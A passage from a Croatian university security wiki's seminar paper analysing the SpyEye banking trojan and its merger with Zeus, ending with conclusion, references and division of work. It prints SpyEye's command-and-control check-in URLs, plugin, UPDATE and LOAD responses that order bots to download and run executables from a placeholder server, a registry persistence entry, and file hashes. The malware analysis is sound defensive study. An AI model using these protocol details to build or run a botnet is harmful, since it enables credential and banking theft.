<ul><li>MD5 sažetak inačice kojom je zaražen bot. C&amp;C softver na poslužitelju uspoređuje sažetak iz poruke s tablicom sažetaka na poslužitelju. Parametar se koristi kako bi se provjerila ispravnost inačice (da li je neizmijenjena)  i potreba za nadogradnjom.
</li></ul>
</li></ul>
<p><br />
Nakon što je poslao prvu poruku, bot svakih 5 minuta nastavlja slati ostale poruke koje su iste kao i početna samo bez parametara: ie, os i ut:
</p>
<pre><a href="http://(server)/gate.php?guid=uname!cname!1A2B3C4D&amp;ver=10260&amp;stat=ONLINE&amp;cpu=0&amp;ccrc=90A01B2D&amp;md5=0516cb89185fee8bee81a15d2859c870" class="external free" rel="nofollow">http://(server)/gate.php?guid=uname!cname!1A2B3C4D&amp;ver=10260&amp;stat=ONLINE&amp;cpu=0&amp;ccrc=90A01B2D&amp;md5=0516cb89185fee8bee81a15d2859c870</a>
</pre>
<h4> <span class="mw-headline" id="Dodaci_SpyEyeu">Dodaci SpyEyeu</span></h4>
<p>Dodaci SpyEyeu koji se koriste kod infekcije se identificiraju u poruci pomoću parametra plg zajedno s imenom dodatka. Najpopularniji dodaci su: billinghammer, bugreport, ccgraber, fcertgrabber, ftpbc, socks5.
</p><p><br />
Primjer poruke koja sadrži podatke o botu s dodacima bilinghammer (za krađu novca s kreditnih kartica korištenjem ukradenih podataka) i bugreport (za dostavljanje informacija o uspjehu otklanjanja pogrešaka SpyEye alatom):
</p>
<pre>http://(server)/gate.php?guid=dmacdonald!VB4!361C13E2&amp;ver=10260&amp;stat=ONLINE&amp;plg=bugreport;
billinghammer&amp;cpu=0&amp;ccrc=90A01B2D&amp;md5=0516cb89185fee8bee81a15d2859c870 
</pre>
<p><br />
Server na kojem se nalazi upravljačka ploča odgovara na poruku iz primjera s podacima o kontroli statusa koji služe za upravljanje stanjem dodataka (kontrolnim kodom 1 dodatak se aktivira, a kontrolnim kodom 0 se deaktivira). Vlasnik botneta može preko upravljačke ploče promijeniti statusni kod dodatka iz stanja neaktivnosti u stanje aktivnosti i obrnuto. Na slici ispod je prikazana promjena statusnog koda dodatka bugreport u aktivno stanje. Čim se bot javi upravljačkoj ploči statusni kod dodatka bugreport biti će promijenjen prema postavci za dodatak u upravljačkoj ploči.
</p><p><br />
Poruka sa neaktivnim dodatkom billinghammer i aktivnim dodatkom bugreport:
</p>
<pre>HTTP/1.1 200 OK (text/html)
PLUGIN&lt;br&gt;billinghammer;0&lt;br&gt;bugreport;1&lt;br&gt;
</pre>
<p><br />
<a href="http://security.foi.hr/wiki/index.php/Datoteka:SpyEye_6.png" class="image"><img alt="SpyEye 6.png" src="../../images/6/66/SpyEye_6.png" width="576" height="320" /></a>
</p>
<h4> <span class="mw-headline" id="A.C5.BEuriranje_aplikacije">Ažuriranje aplikacije</span></h4>
<p>Pomoću izbornika Update Bot vlasnik botneta može ažurirati SpyEye aplikaciju (postaviti novu datoteku). Obično će to uraditi ukoliko antivirusni alati prepoznaju trenutnu verziju koju koristi ili pak ako se pojavi nova, bolja verzija aplikacije. U tablicu „update_bot“ se upisuje MD5 sažetak datoteke. S tim se sažetkom uspoređuje md5 parametar svake poruke koja se primi od strane bota s tom verzijom aplikacije. Ako se dobiveni podatak iz poruke i podatak iz tablice razlikuju, tada se u odgovor na poruku dodaje naredba UPDATE.
</p>
<pre><a href="http://(server)/gate.php?guid=uname!cname!1A2B3C4D&amp;ver=10260&amp;stat=ONLINE&amp;plg=bugreport" class="external free" rel="nofollow">http://(server)/gate.php?guid=uname!cname!1A2B3C4D&amp;ver=10260&amp;stat=ONLINE&amp;plg=bugreport</a>;
</pre>
<p>billinghammer&amp;cpu=0&amp;ccrc=90A01B2D&amp;md5=0516cb89185fee8bee81a15d2859c870
</p><p>Usporedbom vrijednosti parametra md5 i vrijednosti iz tablice može se zaključiti kako se radi o staroj verziji aplikacije jer se vrijednosti razlikuju. U tom slučaju formira se i šalje slijedeći odgovor:
</p>
<pre>HTTP/1.1 200 OK (text/html)
UPDATE&lt;br&gt;PATH=http://(server)/bin/build___.exe
</pre>
<p>Kada primi takav odgovor, bot preuzima novu verziju aplikacije s lokacije koja je navedena u odgovoru i instalira ju. Na sličan način moguće je ažurirati i konfiguracijsku datoteku (config.bin).
</p>
<h4> <span class="mw-headline" id="U.C4.8Ditavanje_i_izvr.C5.A1avanje_aplikacija_na_botu">Učitavanje i izvršavanje aplikacija na botu</span></h4>
<p>Učitavanje i izvršavanje aplikacija na botu je moguće izvesti preko upravljačke ploče. Nakon što su odrađene sve pripreme, šalje se naredba LOAD kao dio odgovora na prvu poruku koja stigne s bota.
</p>
<pre>HTTP/1.1 200 OK (text/html)
LOAD&lt;br&gt;http://(server)/bin/upload/calc.exe&lt;br&gt;121
</pre>
<p>Potvrda o uspjehu preuzimanja ovisi o sustavu dojave greške. Na kraju naredbe LOAD nalazi se u ovom slučaju broj 121 koji predstavlja identifikator zadatka pomoću kojeg se razlučuje uspjeh ili neuspjeh. Taj se broj dodaje u sljedeću poruku bota kao vrijednost parametra tid kojim se identificira zadatak.
</p>
<pre>http://(server)/gate.php?guid=uname!cname!1A2B3C4D&amp;ver=10260&amp;stat=LOADCOMPLETE&amp;tid=121&amp;rep=TASK%20IS%20OK&amp;
 cpu=36&amp;ccrc=7CF6CDB7&amp;md5=705db7f1d97be9cfd4991378648ea7a2
</pre>
<p>Uspješno učitavanje može se prepoznati iz vrijednosti parametra stat koja je postavljena na  LOAD-COMPLETE i tekstualne vrijednosti parametra rep koja je postavljena na TASK IS OK. Neuspjeh naredbe LOAD očituje se statusom asstat=LOAD-ERROR s opisom greške. Mogući su još neki oblici poruka za dojavu greške.
</p>
<pre>http://(server)/gate.php?guid=dmacdonald!VB4!361C13E2&amp;ver=10260&amp;stat=LOADERROR&amp;tid=121&amp;
 rep=[ERROR]%20:%20Cannot%20create%20thread.%200o%20:%20dwErr%20==%201455&amp;cpu=1&amp;ccrc=7CF6CDB7&amp;md5=705db7f1d97be9cfd4991
</pre>
<h3> <span class="mw-headline" id="SpyEye_analiza">SpyEye analiza</span></h3>
<p>Kada se pojavio SpyEye je bio „nevidljiv“ antivirusnim programima. S vremenom su ga počeli detektirati, ali se pokazalo da i relativno male izmjene na njegovom kodu mogu zamaskirati njegovu prisutnost na korisničkim računalima od antivirusnih programa. Kod instalacije SpyEye alata na računalu se kreiraju 3 datoteke:
</p>
<ul><li>cleansweep.exe - aplikacija
</li><li>config.bin - enkriptirana konfiguracijska datoteka
</li><li>upd1.tmp
</li></ul>
<p>U tablici su prikazane lokacije na kojima bi trebalo potražiti datoteke SpyEyea ukoliko se posumnja na zaraženost računala ovim trojanskim konjem [LSS]:
</p>
<table border="1">
  <tr>
         <th>  Datoteka    </th>
         <th>  Veličina   </th>
          <th>  Sažetak   </th>
 </tr>
  <tr>
         <td>  c:\cleansweep.exe\cleansweep.exe    </td>
         <td>  103.936 B </td>
         <td>  <b>MD5:</b>
<p>0xACD72596485C85F6
14ADBC9BB6117ACB
</p><p><b>SHA-1:</b>
</p><p>0x880DED724E7FADB8665
7C72749C42CC3288AE434
</p>
 </td>
  </tr>
  <tr>
         <td>  c:\cleansweep.exe\config.bin    </td>
         <td>  406 B   </td>
          <td>  <b>MD5:</b>
<p>0x9268DB3CBA3C94F
B6175DCE518BB567F
</p><p><b>SHA-1:</b>
</p><p>0xEFFD6C68B9220B4BAD1
4B3DB644789CEFC5DB09C
</p>
   </td>
  </tr>

  <tr>
         <td> &#160;%TempFolder%\upd1.tmp    </td>
         <td>  136.704 B   </td>
         <td>  <b>MD5:</b>
<p>0x47FAC6A11E7CA1A
DC19BF6DD041F9DFE
</p><p><b>SHA-1:</b>
</p><p>0x21888F3F2A4C8938C0D7
10BECDC0D41B6714C9E2
</p>
   </td>
  </tr>
</table>
<p><br />
SpyEye se pokreće prilikom paljenja računala. Da bi u tome uspio radi promjene u sistemskom registru. U registru se postavlja sljedeća vrijednost:
</p>
<pre>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]&quot;cleansweep.exe&quot;=&quot;%systemdrive%\cleansweep.exe\cleansweep.exe&quot;
</pre>
<p>SpyEye koristi sljedeće Windows API funkcije kako bi se sakrio i nadgledao funkcioniranje sustava: CryptEncrypt, LdrLoadDll, NtEnumerateValueKey, NtQueryDirectoryFile, NtResumeThread, NtVdmControl, TranslateMessage, HttpSendRequestA, HttpSendRequestW, HttpOpenRequestA, HttpAddRequestHeadersA, HttpQueryInfoA, InternetQueryDataAvailable, InternetCloseHandle, InternetReadFile, InternetReadFileExA, InternetWriteFile, send, PR_Read, PR_Write, PR_Close, PR_OpenTCPSocket, PFXImportCertStore.
</p><p>SpyEye nije moguće pronaći u upravitelju zadataka (eng. Task manager) zato jer se pokreće i izvodi svoj kod unutar drugih procesa. Primijećeno je naime kako su u određenim legitimnim procesima stvorene dodatne memorijske stranice koje upućuju na njihovu infekciju. U tablici su prikazani procesi unutar kojih se skriva [LSS]:
</p><p><br />
</p>
<table border="1">
  <tr>
         <th>  Proces   </th>
         <th>  Datoteka procesa   </th>
          <th>  Dodijeljena veličina   </th>
 </tr>
  <tr>
         <td>  services.exe    </td>
         <td>  %System%\services.exe </td>
         <td>  167.936 B  </td>
  </tr>
  <tr>
         <td>  Isass.exe    </td>
         <td>  %System%\Isass.exe</td>
         <td>  167.936 B</td>
  </tr>

  <tr>
         <td>  svchost.exe    </td>
         <td>  %System%\svchost.exe  </td>
         <td>  167.936 B</td>
  </tr>

 <tr>
         <td>  svchost.exe    </td>
         <td>  %System%\svchost.exe  </td>
         <td>  167.936 B</td>
  </tr>

 <tr>
         <td>  svchost.exe    </td>
         <td>  %System%\svchost.exe  </td>
         <td>  167.936 B</td>
  </tr>

 <tr>
         <td>  svchost.exe    </td>
         <td>  %System%\svchost.exe  </td>
         <td>  167.936 B</td>
  </tr>

 <tr>
         <td>  svchost.exe    </td>
         <td>  %System%\svchost.exe  </td>
         <td>  167.936 B</td>
  </tr>

 <tr>
         <td>  alg.exe    </td>
         <td>  %System%\alg.exe  </td>
         <td>  167.936 B</td>
  </tr>


</table>
<h3> <span class="mw-headline" id="Hibrid_SpyEye_i_Zeus_trojanaca">Hibrid SpyEye i Zeus trojanaca</span></h3>
<p>Krajem 2010. pojavile su se glasine o mogućem spajanju SpyEye i Zeus trojanaca. Nedugo, nakon što se vijest proširila hakerskim forumima i blogovima koji se bave problemima sigurnosti, stručnjaci za računalnu sigurnost su usmjerili pozornost na izjavu tvorca SpyEya u kojoj spominje skori izlazak novog super trojanca (spajanje koda Zeus i SpyEye trojanaca). Među ostalim najavljuje nove mogućnosti pomoću kojih bi trebao postati veći i bolji nego bilo koji do sad:
</p>
<ul><li>povećana modularnost i jednostavnost održavanja (korištenje odvojenih dll datoteka za svaku od malicioznih mogućnosti)
</li><li>programirati trojanca kao Ring0 rootkit
</li><li>„Remote control“ plugin (VNC) dodatak
</li><li>poboljšane HTML injekcije (Zeus injekcije su kvalitetnije napisane nego one kod SpyEyea)
</li><li>novi admin panel – hibridno sučelje koje bi trebalo kombinirati administratorske panele od oba trojanca (SpyEyea i Zeusa)
</li></ul>
<p><br />
U verziji v1.3 SpyEye je preuzeo neke od mogućnosti Zeusa [RSA]:
</p>
<ul><li>integracija Zeus koda u IE HTML mehanizam za injekciju
</li><li>modificirana metoda za enkripciju SpyEye konfiguracijske datoteke
</li><li>izgrađen je kao legitimni program (enkapsulirana izvršna modularna arhitektura)
</li><li>često modificirane informacije se nalaze unutar PE resources sekcije
</li><li>udaljena dretva izvršava injektirani kod
</li></ul>
<p><br />
SpyEye kod za injekciju HTML-a u stranice preglednika nije mogao injektirati HTML u web stranice koje preglednici spremaju na disk (koriste ga za „cache“ – privremenu memoriju) kako bi ih kod ponovnog učitavanja mogli brže učitati. Nemogućnost injekcije lažnog HTML sadržaja u web stranice koje se nalaze u privremenoj memoriji zahtijevala je od SpyEyea da uvijek iznova briše kompletni sadržaj privremene memorije prije nego želi injektirati lažni u HTML web stranice. S druge strane, Zeus ima puno bolje rješenje koje omogućava injekciju u web stranice koje su preglednici pohranili u privremenu memoriju na disku. Takvu je injekciju puno teže primijetiti, a pored toga se i brže izvodi. To je ujedno i razlog zašto je SpyEye iskoristio dio programskog koda Zeusa kako bi poboljšao vlastiti mehanizam HTML injekcije.
</p><p>Zeus Trojan (v2.0.8.9) asembler kod za HTML injekciju (preuzeto iz Zeus asemblerskog koda) [RSA]
<a href="http://security.foi.hr/wiki/index.php/Datoteka:SpyEye_7.png" class="image"><img alt="SpyEye 7.png" src="../../images/f/f2/SpyEye_7.png" width="609" height="590" /></a>
</p><p><br />
Identični Zeus dio asembler koda korišten u SpyEye Hybrid verziji  (v1.3.5) 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:SpyEye_8.png" class="image"><img alt="SpyEye 8.png" src="../../images/4/43/SpyEye_8.png" width="605" height="475" /></a>
</p><p><br />
Osim HTML injekcije poboljšana je i enkripcija konfiguracijske datoteke. Nova verzija ne skriva enkripcijski ključ konfiguracijske datoteke. Umjesto toga, autor SpyEyea vjeruje kako mogući prevaranti neće prokužiti i probiti njegov algoritam za enkripciju. S obzirom na sve ostale dijelove SpyEye alata ugrađena enkripcija i nije u dovoljnoj mjeri usavršena. Ipak, sasvim je dovoljna za zaštitu od automatiziranih sigurnosnih alata. 
</p><p><br />
SpyEye se može preuzeti kao legitimni softver budući da počiva na modularnoj arhitekturi pomoću koje se SpyEye ugrađuje u drugu izvršnu datoteku. Pomoću metode enkapsulacije prvi sloj (EXE) priprema potrebne resurse (instalacijsko okruženje) za drugi – unutrašnji sloj (ugrađeni EXE) koji zapravo predstavlja samog trojanca. Nakon pokretanja prvi sloj se ne uklanja s računala.
</p><p><br />
U takvoj hibridnoj verziji, autor je preselio SpyEye konfiguracijski ključ za enkripciju, konfiguracijsku datoteku i još neke dijelove programskog koda u PE resources dio datoteke. Razlog tome je očekivanje da će se ti podaci često mijenjati. Ujedno takav način pohrane omogućava lakše održavanje alata, daljnji razvoj enkripcije i obfuskacije osjetljivih dijelova SpyEyea.
</p><p><br />
Pored svih nabrojanih novih mogućnosti hibrid SpyEyea i Zeusa ima novi mehanizam za injekciju. Umjesto da se sam injektira u ciljani proces, SpyEye će se injektirati u potpuno drugi proces. Za svoje potrebe koristit će memorijski prostor tog procesa i njegove resurse.  Unutar memorijskog prostora u koji se injektirao kreira udaljenu dretvu kojoj je zadatak izvršiti učitani kod s te lokacije. Na taj se način SpyEye još bolje sakriva od antivirusnih alata.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Igor.mirkovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Igor.mirkovic (stranica ne postoji)">Igor.mirkovic</a> 00:25, 7. siječnja 2012. (CET)
</p>
<h2> <span class="mw-headline" id="Zaklju.C4.8Dak">Zaključak</span></h2>
<p>Na temelju svega dosad napisanoga, možemo zaključiti kako sigurnost informacijskih sustava može biti narušena raznim oblicima malwarea koji danas postaju sve naprednijima. S obzirom na veliki uspjeh Interneta, odnosno njegovo masovno korištenje, određeni ljudi su uvidjeli da mogu iz toga izvući veliku korist te tako danas nastaju napredni malwarei koji omogućuju ostvarivanje različitih kriminalnih radnji. U ovom radu fokus smo stavili na botnete koji omogućuju kontroliranje mreže kompromitiranih računala te tako ostvarivanje napadačevih namjera poput krađe identiteta i korisničkih podataka, slanje neželjene pošte, prevare klikom, uskraćivanje usluga itd.. Za sve navedeno veliku zaslugu možemo pripisati dva napredna oblika bot-ova, Zeus i SpyEye. Iako prisutni dugi niz godina ova dva bot-a u sklopu s alatima za kontrolu imaju vrlo velik udio među zaraženim računalima, i iako se njihovi izvorni kodovi svako malo mogu naći na internetu i dalje imamo skupine ljudi koje rade na njihovom razvoju. Kroz niz primjera vidjeli smo da se ova dva alata mogu jednostavno koristiti što ih čini potencijalno još većom prijetnjom zbog svoje dostupnosti široj populaciji ljudi. Iako današnje antivirusne kuće imaju veliki postotak uspješnosti detektiranja raznih botova još uvijek je taj postotak dovoljno nizak da se na internetu nalazi velik broj pozamašnih botnet-a. U konačnici valja napomenuti da je ovaj oblik malicioznog koda vrlo prisutan i vrlo efektivan u obavljanju svojih kriminalnih aktivnosti. 
</p>
<h2> <span class="mw-headline" id="Literatura">Literatura</span></h2>
<ul><li>OECD. Malicious Software (Malware): A Security Threat to the Internet Economy. Preuzeto 15.12.2011. sa: <a href="http://www.oecd.org/dataoecd/53/34/40724457.pdf" class="external free" rel="nofollow">http://www.oecd.org/dataoecd/53/34/40724457.pdf</a>   
</li><li>Wikipedia. Malware. Preuzeto 15.12.2011. sa: <a href="http://en.wikipedia.org/wiki/Malware#cite_note-0" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/Malware#cite_note-0</a>   
</li><li>The Official Social Engineering Portal. Social Engineering. Preuzeto 15.12.2011. sa: <a href="http://www.social-engineer.org/" class="external free" rel="nofollow">http://www.social-engineer.org/</a> 
</li><li>IATAC. Malware. Preuzeto 15.12.2011. sa:<a href="http://iac.dtic.mil/iatac/download/malware.pdf" class="external free" rel="nofollow">http://iac.dtic.mil/iatac/download/malware.pdf</a>  
</li><li>Spam Laws. Types of Malware. Preuzeto 16.12.2011. sa: <a href="http://www.spamlaws.com/malware-types.html" class="external free" rel="nofollow">http://www.spamlaws.com/malware-types.html</a> 
</li><li>Information Services &amp; Technology. Viruses, Spyware &amp; Malware. Preuzeto 16.12.2011. sa: <a href="http://ist.mit.edu/security/malware" class="external free" rel="nofollow">http://ist.mit.edu/security/malware</a>  
</li><li>National Institute of standards and Technology. Guide to Malware Incident Prevention and Handling. Preuzeto 16.12.2011. sa: <a href="http://csrc.nist.gov/publications/nistpubs/800-83/SP800-83.pdf" class="external free" rel="nofollow">http://csrc.nist.gov/publications/nistpubs/800-83/SP800-83.pdf</a> 
</li><li>FireEye. Advanced Malware Exposed. Preuzeto 16.12.2011. sa: <a href="http://resources.idgenterprise.com/original/AST-0038416_FireEye_AdvMalwareExposed.pdf" class="external free" rel="nofollow">http://resources.idgenterprise.com/original/AST-0038416_FireEye_AdvMalwareExposed.pdf</a>
</li><li>Damballa. Advanced Malware. Preuzeto 17.12.2011. sa: <a href="http://www.damballa.com/cyber-threats/advanced_malware.php" class="external free" rel="nofollow">http://www.damballa.com/cyber-threats/advanced_malware.php</a>
</li><li>Digital Era Solutions. 5 Design Principles for Advanced Malware Protection. Preuzeto 17.12.2011. sa: <a href="http://www.digitaleragroup.com/component/rokdownloads/downloads/fireeye/254-principles-of-malware-protection-/download.html" class="external free" rel="nofollow">http://www.digitaleragroup.com/component/rokdownloads/downloads/fireeye/254-principles-of-malware-protection-/download.html</a>
</li><li>ENISA. Botnets: Detection, Measurement, Disinfection &amp; Defence. Preuzeto 17.12.2011. sa: <a href="http://www.enisa.europa.eu/act/res/botnets/botnets-measurement-detection-disinfection-and-defence" class="external free" rel="nofollow">http://www.enisa.europa.eu/act/res/botnets/botnets-measurement-detection-disinfection-and-defence</a>
</li><li>YouTube. World Business: Botnets -- 01/04/2011. Preuzeto 17.12.2011. sa: <a href="http://www.youtube.com/watch?v=WrYGUYBbSEk&amp;feature=player_embedded#" class="external free" rel="nofollow">http://www.youtube.com/watch?v=WrYGUYBbSEk&amp;feature=player_embedded#</a>
</li><li>Wikipedia. Botnet. Preuzeto 17.12.2011. sa: <a href="http://en.wikipedia.org/wiki/Botnet#cite_note-0" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/Botnet#cite_note-0</a>
</li><li>KoreLogic Security. Botnets: An Introduction Into the World of Botnets. Preuzeto 17.12.2011. sa: <a href="http://www.korelogic.com/Resources/Presentations/botnets_issa.pdf" class="external free" rel="nofollow">http://www.korelogic.com/Resources/Presentations/botnets_issa.pdf</a>
</li><li>Institut für Internet-Sicherheit. Botnets – Literature Survey and Report. Preuzeto 17.12.2011. sa: <a href="http://www.internet-sicherheit.de/fileadmin/docs/publikationen/dietrich/Christian-Rossow-Christian-J.-Dietrich-Literature-survey-and-Report.pdf" class="external free" rel="nofollow">http://www.internet-sicherheit.de/fileadmin/docs/publikationen/dietrich/Christian-Rossow-Christian-J.-Dietrich-Literature-survey-and-Report.pdf</a>
</li><li>Sprotus. Study of Botnets and Their Threats to Internet Security. Preuzeto 18.12.2011. sa: <a href="http://sprouts.aisnet.org/594/1/Botnet_Sprotus.pdf" class="external free" rel="nofollow">http://sprouts.aisnet.org/594/1/Botnet_Sprotus.pdf</a>
</li><li>MALWARE CITY. Anatomy of a Botnet. Preuzeto 18.12.2011. sa: <a href="http://www.malwarecity.com/blog/anatomy-of-a-botnet-196.html" class="external free" rel="nofollow">http://www.malwarecity.com/blog/anatomy-of-a-botnet-196.html</a>
</li><li>Ertug Karamatli. Modern Botnets: A Survey and Future Directions. Preuzeto 18.12.2011. sa: <a href="http://docs.karamatli.com/paper/karamatli-modern_botnets.pdf" class="external free" rel="nofollow">http://docs.karamatli.com/paper/karamatli-modern_botnets.pdf</a>
</li><li>CIS. Botnet mreže. Preuzeto 18.12.2011. sa: <a href="http://www.cis.hr/files/dokumenti/CIS-DOC-2011-09-026.pdf" class="external free" rel="nofollow">http://www.cis.hr/files/dokumenti/CIS-DOC-2011-09-026.pdf</a>
</li><li>The Honeynet Project. Uses of botnets. Preuzeto 19.12.2011. sa: <a href="http://www.honeynet.org/node/52" class="external free" rel="nofollow">http://www.honeynet.org/node/52</a>
</li><li>SANS Institute InfoSec Reading Room. Intrusion Detection &amp; Response - Leveraging Next Generation Firewall Technology. Preuzeto 19.12.2011. sa: *<a href="http://www.sans.org/reading_room/whitepapers/firewalls/intrusion-detection-response-leveraging-generation-firewall-technology_33053" class="external free" rel="nofollow">http://www.sans.org/reading_room/whitepapers/firewalls/intrusion-detection-response-leveraging-generation-firewall-technology_33053</a>
</li><li>Spyeye trojan morphs to defeat online banking defenses. Preuzeto 17.12.2011. sa: <a href="http://www.csoonline.com/article/686713/spyeye-trojan-morphs-to-defeat-online-banking-defenses" class="external free" rel="nofollow">http://www.csoonline.com/article/686713/spyeye-trojan-morphs-to-defeat-online-banking-defenses</a>
</li><li>Trojanski konj spyeye u napadu na banke. Preuzeto 17.12.2011. sa:<a href="http://www.cis.hr/Vijesti/trojanski-konj-spyeye-u-napadu-na-banke.html" class="external free" rel="nofollow">http://www.cis.hr/Vijesti/trojanski-konj-spyeye-u-napadu-na-banke.html</a>
</li><li>AVIRA,Analysis of TR.Spy_.SpyEye. Preuzeto 17.12.2011. sa:<a href="http://techblog.avira.com/wp-content/uploads/2011/03/Analysis-of-TR.Spy_.SpyEye.pdf" class="external free" rel="nofollow">http://techblog.avira.com/wp-content/uploads/2011/03/Analysis-of-TR.Spy_.SpyEye.pdf</a>
</li><li> RSA, New spyeye gains zeus features a detailed analysis of spyeye trojan. Preuzeto 17.12.2011. sa: <a href="http://blogs.rsa.com/rsafarl/new-spyeye-gains-zeus-features-a-detailed-analysis-of-spyeye-trojan-v1-3/" class="external free" rel="nofollow">http://blogs.rsa.com/rsafarl/new-spyeye-gains-zeus-features-a-detailed-analysis-of-spyeye-trojan-v1-3/</a>
</li><li>Analiza zlonamjernog programa spyeye. Preuzeto 17.12.2011. sa: <a href="http://sigurnost.lss.hr/Novi-dokumenti/analiza-zlonamjernog-programa-spyeye.html" class="external free" rel="nofollow">http://sigurnost.lss.hr/Novi-dokumenti/analiza-zlonamjernog-programa-spyeye.html</a>
</li><li>LSS, Informacijska sigurnost.Preuzeto 17.12.2011. sa <a href="http://sigurnost.lss.hr/images/dokumenti/lss-pubdoc-2011-02-012.pdf" class="external free" rel="nofollow">http://sigurnost.lss.hr/images/dokumenti/lss-pubdoc-2011-02-012.pdf</a>,
</li><li>Clash of the Titans: ZeuS v SpyEye. Preuzeto 20.12.2011. sa <a href="http://www.sans.org/reading_room/whitepapers/malicious/clash-titans-zeus-spyeye_33393" class="external free" rel="nofollow">http://www.sans.org/reading_room/whitepapers/malicious/clash-titans-zeus-spyeye_33393</a>
</li><li>Zeus: King of the Bots. Preuzeto 20.12.2011. sa <a href="http://ivanlef0u.fr/repo/todo/zeus_king_of_bots.pdf" class="external free" rel="nofollow">http://ivanlef0u.fr/repo/todo/zeus_king_of_bots.pdf</a>
</li><li>On the Analysis of the Zeus Botnet Crimeware
</li></ul>
<p>Toolkit. Preuzeto 20.12.2011. sa <a href="http://www.ncfta.ca/papers/On_the_Analysis_of_the_Zeus_Botnet_Crimeware.pdf" class="external free" rel="nofollow">http://www.ncfta.ca/papers/On_the_Analysis_of_the_Zeus_Botnet_Crimeware.pdf</a>
</p>
<ul><li>Zeus analiza. Preuzeto 20.12.2011. sa <a href="http://www.fortiguard.com/analysis/zeusanalysis.html" class="external free" rel="nofollow">http://www.fortiguard.com/analysis/zeusanalysis.html</a>
</li></ul>
<h2> <span class="mw-headline" id="Podjela_rada">Podjela rada</span></h2>
<p>Anita Laktašić
</p>
<ul><li>Uvod
</li><li>Malware
<ul><li>Definicija malwarea
</li><li>Karakteristike malwarea
</li><li>Način rada malwarea i ranjivosti koje koristi
</li><li>Kategorizacija malwarea
</li></ul>
</li><li>Napredni malware
<ul><li>Definicija naprednog malwarea
</li><li>Životni ciklus naprednog malwarea
</li><li>Svrha naprednog malwarea
</li></ul>
</li><li>Botneti
<ul><li>Definicija botneta
</li><li>Stvaranje i širenje botneta
<ul><li>Primjer kreiranja botneta i njegova širenja
</li></ul>
</li><li>Command and Control infrastruktura
<ul><li>Centralizirana C&amp;C struktura
</li><li>Peer to Peer (P2P) C&amp;C struktura
</li><li>Hibridna C&amp;C struktura
</li><li>Usporedba C&amp;C struktura
</li><li>Uloga DNS-a za botnete
</li></ul>
</li><li>Botnet komunikacijski protokoli
</li><li>Motivacija i koristi od botneta
</li><li>Prevencija, detekcija i prekidanje botneta
</li></ul>
</li></ul>
<p>Branko Rendulić
</p>
<ul><li> Zeus 
<ul><li> Predstavljanje Zeusa
</li><li> Zeus toolkit 
<ul><li> Postavljanje okoline
</li><li> Builder
</li><li> Control Panel
</li><li> Zeus Config
</li><li> Upravljanje zaraženim računalom
</li></ul>
</li><li> Analiza zeus bota 
<ul><li> Instalacija bota i source
</li><li> Komunikacija
</li></ul>
</li><li> Zaključak o zeusu
</li></ul>
</li></ul>
<p>Igor Mirković
</p>
<ul><li>Predstavljanje SpyEye
<ul><li>Značajke SpyEye alata
</li><li>Način rada
<ul><li>Dodaci SpyEyeu
</li><li>Ažuriranje aplikacije
</li><li>Učitavanje i izvršavanje aplikacija na botu
</li></ul>
</li><li>SpyEye analiza
</li><li>Hibrid SpyEye i Zeus trojanaca</div>
</li></ul>
</li></ul>
</div>
</div>

<!-- 
NewPP limit report
Preprocessor node count: 328/1000000
Post-expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key sisds:pcache:idhash:15-0!*!0!!hr!2!edit=0 and timestamp 20190203204032 -->
<div class="printfooter">
Dobavljeno iz "<a href="_spyeye_sourcea.html">http://security.foi.hr/wiki/index.php/Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea</a>"</div>
				<!-- /bodytext -->
								<!-- catlinks -->
				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
												<div class="visualClear"></div>
			</div>
			<!-- /bodyContent -->
		</div>
		<!-- /content -->
		<!-- header -->
		<div id="mw-head" class="noprint">
			
<!-- 0 -->
<div id="p-personal" class="">
	<h5>Osobni alati</h5>
	<ul>
					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
			</ul>
</div>

<!-- /0 -->
			<div id="left-navigation">
				
<!-- 0 -->
<div id="p-namespaces" class="vectorTabs">
	<h5>Imenski prostori</h5>
	<ul>
					<li  id="ca-nstab-main" class="selected"><span><a href="_spyeye_sourcea.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-variants" class="vectorMenu emptyPortlet">
		<h5><span>Inačice</span><a href="_spyeye_sourcea.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->
			</div>
			<div id="right-navigation">
				
<!-- 0 -->
<div id="p-views" class="vectorTabs">
	<h5>Pogledi</h5>
	<ul>
					<li id="ca-view" class="selected"><span><a href="_spyeye_sourcea.html" >Čitaj</a></span></li>
					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-cactions" class="vectorMenu emptyPortlet">
	<h5><span>Radnje</span><a href="_spyeye_sourcea.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->

<!-- 2 -->
<div id="p-search">
